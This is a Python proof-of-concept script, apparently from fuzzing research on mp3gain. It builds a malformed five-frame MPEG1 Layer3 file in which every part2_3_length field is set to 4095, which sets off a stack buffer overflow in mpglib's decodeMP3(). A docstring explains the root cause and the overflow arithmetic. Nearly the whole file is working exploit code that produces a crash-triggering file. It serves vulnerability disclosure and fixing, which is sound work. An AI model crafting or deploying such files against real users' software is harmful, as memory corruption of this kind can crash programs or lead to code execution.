#!/usr/bin/env python3
"""
PoC for VULN 001: Stack Buffer Overflow in decodeMP3() via inflated part2_3_length

Root cause:
  In decodeMP3() (interface.c), for MPEG1 Layer3 stereo frames:
    1. wordpointer = bsspace[bsnum] + 512  (line 556)
    2. copy_mp(mp, ssize=32, wordpointer)  (line 573) -- copies side info into bsspace
    3. do_layer3_sideinfo() calls getbits() which advances wordpointer by ssize=32 bytes
       so wordpointer is now at bsspace[bsnum] + 544
    4. dsize = (sum_of_all_part2_3_length + 7) / 8
       With all 4 granule-channel slots set to 4095: dsize = (4*4095+7)//8 = 2048
    5. copy_mp(mp, dsize=2048, wordpointer)  (line 618) -- writes 2048 bytes at offset 544
    6. bsspace total size = MAXFRAMESIZE+512 = 1792+512 = 2304 bytes
       Available from offset 544: 2304 - 544 = 1760 bytes
       Overflow: 2048 - 1760 = 288 bytes past end of bsspace[bsnum]

Trigger conditions:
  - MPEG1 Layer3 stereo (ssize=32, 4 granule-channel slots)
  - part2_3_length[gr][ch] = 4095 for all gr in {0,1}, ch in {0,1}
  - main_data_begin = 0 (data starts at beginning of frame, no reservoir backstep)
  - mp->bsize >= 2048 when line 614 check occurs (ensured by using large frames / multiple frames)
"""
import struct
import os
import sys

OUTPUT_PATH = "/data/ylwang/non-textfuzz/target/_poc/mp3gain/mpglibDBL_interface_c/vuln_001.mp3"

def build_frame_header(bitrate_idx, samplerate_idx, padding, channel_mode, mode_ext=0b10):
    """Build 4-byte MPEG1 Layer3 frame header (no CRC)."""
    b0 = 0xFF
    # sync(8 of 11) | MPEG1(11) | Layer3(01) | no-protection(1)
    b1 = 0xFB
    # bitrate_idx(4) | samplerate_idx(2) | padding(1) | private(1)
    b2 = ((bitrate_idx & 0xF) << 4) | ((samplerate_idx & 0x3) << 2) | ((padding & 1) << 1) | 0
    # channel_mode(2) | mode_ext(2) | copyright(1) | original(1) | emphasis(2)
    b3 = ((channel_mode & 0x3) << 6) | ((mode_ext & 0x3) << 4) | 0b0100  # original=1
    return bytes([b0, b1, b2, b3])

def build_side_info_stereo_max_p23():
    """
    Build 32-byte MPEG1 stereo side info with:
      - main_data_begin = 0  (no bit-reservoir backstep, data starts in this frame)
      - private_bits = 0
      - scfsi = 0 for all channels
      - part2_3_length = 4095 for ALL 4 granule×channel slots  <-- triggers overflow
      - big_values = 0
      - global_gain = 127 (a plausible value)
      - scalefac_compress = 0
      - window_switching_flag = 0 (normal block, avoids block_type/mixed_block parsing)
      - table_select[0..2] = 0
      - region0_count = 0, region1_count = 0
      - preflag = 0, scalefac_scale = 0, count1table_select = 0

    Total bits: 9+3+8 + 4*(12+9+8+4+1+5+5+5+4+3+1+1+1) = 20 + 4*59 = 20+236 = 256 = 32 bytes
    """
    bits = []

    def push_bits(val, n):
        """Push n bits of val, MSB first."""
        for i in range(n - 1, -1, -1):
            bits.append((val >> i) & 1)

    # Header fields
    push_bits(0, 9)   # main_data_begin = 0
    push_bits(0, 3)   # private_bits = 0
    push_bits(0, 4)   # scfsi[ch=0][0..3] = 0000
    push_bits(0, 4)   # scfsi[ch=1][0..3] = 0000

    # Granule-channel fields (2 granules × 2 channels)
    for gr in range(2):
        for ch in range(2):
            push_bits(4095, 12)  # part2_3_length = 4095 = 0xFFF (MAX, 12-bit field)
            push_bits(0, 9)      # big_values = 0
            push_bits(127, 8)    # global_gain = 127
            push_bits(0, 4)      # scalefac_compress = 0
            push_bits(0, 1)      # window_switching_flag = 0 (normal block)
            # window_switching_flag=0: table_select[3] + region counts (no block_type field)
            push_bits(0, 5)      # table_select[0] = 0
            push_bits(0, 5)      # table_select[1] = 0
            push_bits(0, 5)      # table_select[2] = 0
            push_bits(0, 4)      # region0_count = 0
            push_bits(0, 3)      # region1_count = 0
            push_bits(0, 1)      # preflag = 0
            push_bits(0, 1)      # scalefac_scale = 0
            push_bits(0, 1)      # count1table_select = 0
            # Total per gr×ch: 12+9+8+4+1+5+5+5+4+3+1+1+1 = 59 bits

    assert len(bits) == 256, f"Expected 256 bits, got {len(bits)}"

    # Pack bits into bytes (MSB first per byte)
    result = bytearray(32)
    for i, b in enumerate(bits):
        if b:
            result[i // 8] |= (1 << (7 - (i % 8)))
    return bytes(result)

def calc_frame_size(bitrate_kbps, samplerate_hz, padding=0):
    """MPEG1 Layer3 frame size in bytes."""
    return (144 * bitrate_kbps * 1000 // samplerate_hz) + padding

def main():
    # Use 320kbps MPEG1 Layer3 Joint Stereo 44100Hz (maximum standard bitrate)
    # Frame size = floor(144 * 320000 / 44100) = 1044 bytes
    # Payload per frame = 1044 - 4 (header) - 32 (side info) = 1008 bytes
    #
    # We need mp->bsize >= dsize=2048 at line 614 check.
    # After header (4 bytes consumed) and ssize (32 bytes consumed from bsize),
    # we need bsize >= 2048, so before ssize consumption: bsize >= 2080.
    # With 3 frames = 3*1044 = 3132 bytes total:
    #   after header: bsize = 3132 - 4 = 3128
    #   after ssize:  bsize = 3128 - 32 = 3096 >= 2048  ✓
    # Use 5 frames for extra safety.

    BITRATE_IDX = 0xE       # 320 kbps for MPEG1 Layer3
    SAMPLERATE_IDX = 0x0    # 44100 Hz
    PADDING = 0
    CHANNEL_MODE = 0b01     # joint stereo

    header = build_frame_header(BITRATE_IDX, SAMPLERATE_IDX, PADDING, CHANNEL_MODE)
    side_info = build_side_info_stereo_max_p23()

    fsize = calc_frame_size(320, 44100, PADDING)
    assert fsize == 1044, f"Unexpected frame size: {fsize}"

    payload_size = fsize - 4 - 32  # = 1008 bytes
    # Fill with 0xAA pattern - non-zero, avoids accidental sync bytes
    payload = bytes([0xAA] * payload_size)

    frame = header + side_info + payload
    assert len(frame) == fsize, f"Frame length mismatch: {len(frame)} != {fsize}"

    # 5 identical frames = 5220 bytes total
    NUM_FRAMES = 5
    mp3_data = frame * NUM_FRAMES

    # Verify overflow arithmetic
    databits = 4 * 4095          # = 16380
    dsize = (databits + 7) // 8  # = 2048
    MAXFRAMESIZE = 1792
    bsspace_total = MAXFRAMESIZE + 512  # = 2304
    bsspace_available = bsspace_total - 512 - 32  # = 1760 (offset 544)
    overflow_bytes = dsize - bsspace_available     # = 288

    os.makedirs(os.path.dirname(OUTPUT_PATH), exist_ok=True)
    with open(OUTPUT_PATH, 'wb') as f:
        f.write(mp3_data)

    print(f"[+] Written {len(mp3_data)} bytes ({NUM_FRAMES} frames × {fsize} bytes) to:")
    print(f"    {OUTPUT_PATH}")
    print(f"[+] Frame header:    {header.hex()}")
    print(f"[+] Side info:       {side_info.hex()}")
    print(f"[+] part2_3_length:  4095 for all 4 gr×ch slots")
    print(f"[+] dsize computed:  (4×4095+7)/8 = {dsize} bytes")
    print(f"[+] bsspace[n]:      {bsspace_total} bytes total, {bsspace_available} available after offset 544")
    print(f"[+] Expected overflow: {overflow_bytes} bytes past end of bsspace[bsnum]")

if __name__ == "__main__":
    main()
